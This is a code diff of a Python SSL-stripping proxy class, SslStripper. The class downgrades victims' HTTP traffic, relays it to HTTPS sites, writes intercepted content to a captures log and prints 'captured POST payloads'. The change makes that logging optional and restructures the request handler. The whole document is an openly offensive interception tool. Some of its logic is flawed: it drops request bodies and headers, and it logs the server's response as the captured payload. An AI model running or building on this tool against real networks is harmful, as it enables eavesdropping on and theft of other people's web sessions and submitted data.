@@ -9,94 +9,103 @@ import requests
 from termcolor import colored
 
 class SslStripper:
-    def __init__(self, port=80):
+    def __init__(self, port=80, logging=True):
         self.port = port
-        self.server = HTTPServer(("", self.port), self.ForwardingHandler)
+        self.logging = logging
+        self.server = HTTPServer(("", self.port), self.create_forwarding_handler())
 
-    class ForwardingHandler(SimpleHTTPRequestHandler):
-        def forward_request(self, method):
-            # Get host and path from headers
-            host = self.headers.get("Host")
+    def create_forwarding_handler(self):  # Create forwarding handler with set configuration
+        logging = self.logging
 
-            if "localhost" in host.lower():
-                raise self.BadRequestException("Invalid host")
+        class ForwardingHandler(SimpleHTTPRequestHandler):
+            def __init__(self, *args, **kwargs):
+                super().__init__(*args, **kwargs)
 
-            path = urlparse(self.path).path
+            def forward_request(self, method):
+                # Get host and path from headers
+                host = self.headers.get("Host")
 
-            print(colored(f"[SSL] Forwarding request to https://{host}{path}...", "light_grey"))
+                if "localhost" in host.lower():
+                    raise self.BadRequestException("Invalid host")
 
-            # Forward request to specified host
-            try:
-                response = requests.request(method, f"https://{host}{path}")
-            except requests.exceptions.RequestException as e:
-                raise Exception() from e
+                path = urlparse(self.path).path
 
-            # Extract payload from response
-            payload = response.content
+                print(colored(f"[SSL] Forwarding request to https://{host}{path}...", "light_grey"))
 
-            # Log payload to file
-            with open("captures.log", "a") as f:
-                timestamp = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
-                f.write(f"[{timestamp}] http://{host}{path}: {payload}\n")  # Write capture as line
+                # Forward request to specified host
+                try:
+                    response = requests.request(method, f"https://{host}{path}")
+                except requests.exceptions.RequestException as e:
+                    raise Exception() from e
 
-            # Print payload if POST request
-            if method == "POST":
-                print(colored(f"[SSL] Captured POST payload: {payload}", "light_grey"))
+                # Extract payload from response
+                payload = response.content
 
-            # Return response with payload to client
-            self.send_response(response.status_code)
-            self.send_header("Content-type", response.headers.get("Content-type"))
-            self.end_headers()
-            self.wfile.write(payload)
+                if logging:  # If logging is enabled for SslStripper class
+                    with open("captures.log", "a") as f:  # Log payload to file
+                        timestamp = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
+                        f.write(f"[{timestamp}] http://{host}{path}: {payload}\n")  # Write capture as line
 
-        class BadRequestException(Exception):  # Custom exception for bad requests
-            def __init__(self, message):
-                super().__init__(message)
+                # Print payload to if POST request
+                if method == "POST":
+                    print(colored(f"[SSL] Captured POST payload: {payload}", "light_grey"))
 
-        def handle_exceptions(self, e):
-            if isinstance(e, self.BadRequestException):
-                self.send_error(400, str(e))
-            else:
-                self.send_error(500, str(e))
+                # Return response with payload to client
+                self.send_response(response.status_code)
+                self.send_header("Content-type", response.headers.get("Content-type"))
+                self.end_headers()
+                self.wfile.write(payload)
 
-        def handle_request(self, method="GET"):
-            try:
-                self.forward_request(method)
-            except Exception as e:
-                self.handle_exceptions(e)
+            class BadRequestException(Exception):  # Custom exception for bad requests
+                def __init__(self, message):
+                    super().__init__(message)
 
-        def do_GET(self):
-            self.handle_request()
+            def handle_exceptions(self, e):
+                if isinstance(e, self.BadRequestException):
+                    self.send_error(400, str(e))
+                else:
+                    self.send_error(500, str(e))
 
-        def do_POST(self):
-            self.handle_request("POST")
+            def handle_request(self, method="GET"):
+                try:
+                    self.forward_request(method)
+                except Exception as e:
+                    self.handle_exceptions(e)
 
-        def do_PUT(self):
-            self.handle_request("PUT")
+            def do_GET(self):
+                self.handle_request()
 
-        def do_DELETE(self):
-            self.handle_request("DELETE")
+            def do_POST(self):
+                self.handle_request("POST")
 
-        def do_PATCH(self):
-            self.handle_request("PATCH")
+            def do_PUT(self):
+                self.handle_request("PUT")
 
-        def do_HEAD(self):
-            self.handle_request("HEAD")
+            def do_DELETE(self):
+                self.handle_request("DELETE")
 
-        def do_OPTIONS(self):
-            self.handle_request("OPTIONS")
+            def do_PATCH(self):
+                self.handle_request("PATCH")
 
-        def do_TRACE(self):
-            self.handle_request("TRACE")
+            def do_HEAD(self):
+                self.handle_request("HEAD")
 
-        def do_CONNECT(self):
-            self.handle_request("CONNECT")
+            def do_OPTIONS(self):
+                self.handle_request("OPTIONS")
 
-        def do_OTHER(self):
-            raise self.BadRequestException("Unsupported request method")
+            def do_TRACE(self):
+                self.handle_request("TRACE")
 
-        def log_message(self, format, *args):
-            pass  # Suppress printing of log messages
+            def do_CONNECT(self):
+                self.handle_request("CONNECT")
+
+            def do_OTHER(self):
+                raise self.BadRequestException("Unsupported request method")
+
+            def log_message(self, format, *args):
+                pass  # Suppress printing of log messages
+
+        return ForwardingHandler
 
     def is_port_in_use(self):
         try:
